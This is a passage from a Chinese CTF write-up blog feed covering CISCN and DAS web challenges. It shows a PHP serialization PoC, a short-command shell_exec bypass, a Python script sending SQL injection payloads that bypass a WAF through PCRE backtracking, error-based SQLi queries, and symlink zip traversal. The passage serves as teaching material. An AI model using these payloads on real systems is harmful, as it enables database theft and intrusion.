$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">5</span>||strlen($b)&gt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"you are too long"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> md5($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>($a!==$b&amp;&amp;$a!=$b&amp;&amp;md5($a)==md5($b))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"good"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地测试</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/12.png" class=""><p>绕过了，直接编poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1.000000000000001</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1.000000000000001</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>把生成得数据传给trick就可以</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/13.png" class=""><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>知识点</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言
    
    </summary>
    
    
    
      <category term="CISCN" scheme="http://yoursite.com/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>NLcommand</title>
    <link href="http://yoursite.com/2020/08/18/NLcommand/"/>
    <id>http://yoursite.com/2020/08/18/NLcommand/</id>
    <published>2020-08-18T15:08:16.000Z</published>
    <updated>2020-08-18T15:33:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了<a id="more"></a></h2><p>开始这道题之前先来看点例子，看完就知道怎么做了</p><h3 id="nl命令"><a href="#nl命令" class="headerlink" title="nl命令"></a>nl命令</h3><p>nl命令其实就是linux下计算文件中的行号</p><img src="/2020/08/18/NLcommand/1.png" class=""><p>可以看到不单单返回了行号还返回了对应行号的内容</p><p>下面再来看一个小实验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">&gt;nl</span><br><span class="line">&gt;a.txt</span><br><span class="line">vim a.txt</span><br><span class="line">*</span><br></pre></td></tr></table></figure><img src="/2020/08/18/NLcommand/2.png" class=""><p>先将nl命令写入文件夹，这里用到了通配符<code>*</code>,会将文件夹下的第一个文件名当作bash命令来执行，其他文件名全部都是参数，通过写入nl，再写入测试的文件，调用通配符就能读取该路径下所有文件的行号及其内容，这道题也是这样</p><p>先来看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"hack!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br></pre></td></tr></table></figure><p>可以看到shell的长度不能超过4位，超过就会报hack</p><p>这里就用上面的方法，先写入<code>nl</code>，再用通配符读取即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br></pre></td></tr></table></figure><p>再源码处找到flag</p><img src="/2020/08/18/NLcommand/3.png" class=""><p>顺便回顾之前整理过的知识：</p><p>拓展：</p><p>思路：代替cat<br>cat 由第一行开始显示内容，并将所有内容输出</p><p>tac 从最后一行倒序显示内容，并将所有内容输出</p><p>more 根据窗口大小，一页一页的现实文件内容</p><p>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</p><p>head 只显示头几行</p><p>tail 只显示最后几行</p><p>nl 类似于cat -n，显示时输出行号</p><p>tailf 类似于tail -f</p><p>sort  命令用于将文本文件内容加以排序。</p><p>od  od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;【nl】难了&quot;&gt;&lt;a href=&quot;#【nl】难了&quot; class=&quot;headerlink&quot; title=&quot;【nl】难了&quot;&gt;&lt;/a&gt;【nl】难了
    
    </summary>
    
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>DASfinaltest</title>
    <link href="http://yoursite.com/2020/08/15/DASfinaltest/"/>
    <id>http://yoursite.com/2020/08/15/DASfinaltest/</id>
    <published>2020-08-15T07:48:37.000Z</published>
    <updated>2020-08-16T16:16:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EZSQL"><a href="#EZSQL" class="headerlink" title="EZSQL"></a>EZSQL<a id="more"></a></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件包含</li><li>SQL注入</li><li>php伪协议</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题，url处发现可能存在文件包含，用<code>filter://</code>协议尝试读取，成功，拿到源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/favicon.ico"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"starter-template.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-md navbar-dark bg-dark fixed-top"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"navbar-toggler"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbarsExampleDefault"</span> <span class="attr">aria-controls</span>=<span class="string">"navbarsExampleDefault"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-label</span>=<span class="string">"Toggle navigation"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"navbar-toggler-icon"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"navbarsExampleDefault"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav mr-auto"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./index.php"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item active"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./file.php?file=list"</span>&gt;</span>List<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">aria-labelledby</span>=<span class="string">"dropdown01"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Another action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Something else here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">"main"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"starter-template"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lead"</span>&gt;</span>        </span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"sql.php"</span>)<span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span><span class="comment">&lt;!-- /.container --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript</span></span><br><span class="line"><span class="comment">    ================================================== --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">window.jQuery || document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/jquery-slim.min.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>')</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/popper.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前端代码，在这里面找到了包含的sql.php文件，读取sql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$id=<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) ? $_POST[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT|\/\*.*\*\/|sleep|and|if|&amp;&amp;|\|\||\^|%|ascii|mid|left|greatest|least|substr|=|-|&lt;|&gt;|benchmark|like|in|between|regexp/is'</span>, $id)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($conn,<span class="string">"set names utf8"</span>);</span><br><span class="line">$sql=<span class="string">"select * from `ctf` where id ='"</span>.$id.<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">$row=mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">if</span>($id==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='./img/1.png'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;img src='./img/2.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;img src='./img/3.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"what do you do?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现常用的注入关键词都被过滤了，一些作用相同的关键词也被过滤，这里用到了p神一篇文章的知识来绕过WAF，利用PCRE回溯次数进行过滤，英文版的是100万次，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://das.wetolink.com:44006/sql.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,version(),3#"</span></span><br><span class="line">&#125;</span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#"</span></span><br><span class="line">&#125;<span class="comment">#ctf,flag</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#id,flag</span></span><br><span class="line">data3 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(flag),3 from flag#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#flag&#123;e22d7e217c1ceebc286c3d8e6ee70a0b&#125;  </span></span><br><span class="line">response = requests.post(url=url,data=data3)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h2 id="WrongSQL"><a href="#WrongSQL" class="headerlink" title="WrongSQL"></a>WrongSQL</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>报错注入</li><li>长度限制</li><li>WAF绕过</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>注册登录，在show.php页面发现id处存在注入点，测试发现，注释符，union，空格等被过滤，根据题目以及被过滤的关键词，应该用报错注入</p><p>尝试一下读取版本号，这里空格可以用/**/或者括号绕过,最后面的#(%23)被过滤闭合单引号即可</p><img src="/2020/08/15/DASfinaltest/1.png" class=""><p>读取数据库名，这里会发现有长度限制，准确的讲，报错注入基本都会限制回显长度，用substr截取分两次回显就可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata)),<span class="number">55</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">#XPATH syntax error: '</span>~a,<span class="keyword">sys</span>,z3333333~<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/2.png" class=""><p>读取最后这一个数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)=<span class="string">'z3333333'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/3.png" class=""><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)=<span class="string">'3333333z'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/4.png" class=""><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">1</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span>(extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">substr</span>((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">20</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/5.png" class=""><p>两次的结果拼接即可</p><h2 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>符号链接目录穿越</li><li>弱密码爆破</li><li>zip指令</li></ul><h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题需要登录，万能密码不能登录，并且sql语句没有什么回显，burp爆破账号密码，得到admin/admin</p><img src="/2020/08/15/DASfinaltest/6.png" class=""><p>下面就是建立一个软链接指向flag所在的路径，并且保存压缩成zip文件，要保存符号链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;flag .&#x2F;</span><br><span class="line">zip -r ..&#x2F;tmp.zip . -y</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/7.png" class=""><p>上传文件即可</p><img src="/2020/08/15/DASfinaltest/8.png" class=""><h2 id="sshop"><a href="#sshop" class="headerlink" title="sshop"></a>sshop</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>信息泄露</li><li>python代码审计</li><li>反弹shell</li></ul><h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>扫描目录，发现了<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>下载文件，审计代码</p><p>在<code>www/sshop/view/User.py</code>里发现了可以控制命令执行，在UserImageHandler类中</p><img src="/2020/08/15/DASfinaltest/9.png" class=""><p>这应该是上传个人图片的地方，找一下对应上传的类或方法，在<code>www/sshop/view/Module.py</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUploadHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">self.render(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'OK'</span>&#125;</span><br><span class="line">upload_path = os.path.join(os.path.dirname(__file__), <span class="string">'upload'</span>) </span><br><span class="line">file_metas = self.request.files.get(<span class="string">'file'</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> 